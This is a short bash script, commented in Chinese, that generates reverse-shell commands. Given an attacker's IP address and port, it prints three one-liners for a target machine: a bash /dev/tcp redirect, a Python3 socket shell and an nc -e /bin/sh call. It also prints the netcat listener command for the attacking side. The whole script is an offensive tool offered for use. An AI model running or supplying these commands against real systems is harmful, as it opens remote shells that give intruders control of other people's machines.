#!/bin/bash
# ============================================================
# 反弹 Shell 命令生成脚本
# 用法: bash shell_reverse.sh <本机IP> <监听端口>
# 示例: bash shell_reverse.sh 192.168.10.130 4444
# 说明: 只输出常用反弹命令，需在目标机上执行
# ============================================================
LHOST=$1
LPORT=$2

if [ -z "$LHOST" ] || [ -z "$LPORT" ]; then
    echo "用法: bash shell_reverse.sh <本机IP> <监听端口>"
    echo "示例: bash shell_reverse.sh 192.168.10.130 4444"
    exit 1
fi

echo "[*] 本机监听: $LHOST:$LPORT"
echo "[*] 在目标机上执行以下任一命令获取反向 Shell:"
echo ""
echo "1) Bash:"
echo "   bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""
echo "2) Python3:"
echo "   python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
echo ""
echo "3) nc:"
echo "   nc -e /bin/sh $LHOST $LPORT"
echo ""
echo "[*] 攻击机监听命令:"
echo "   nc -lvnp $LPORT"
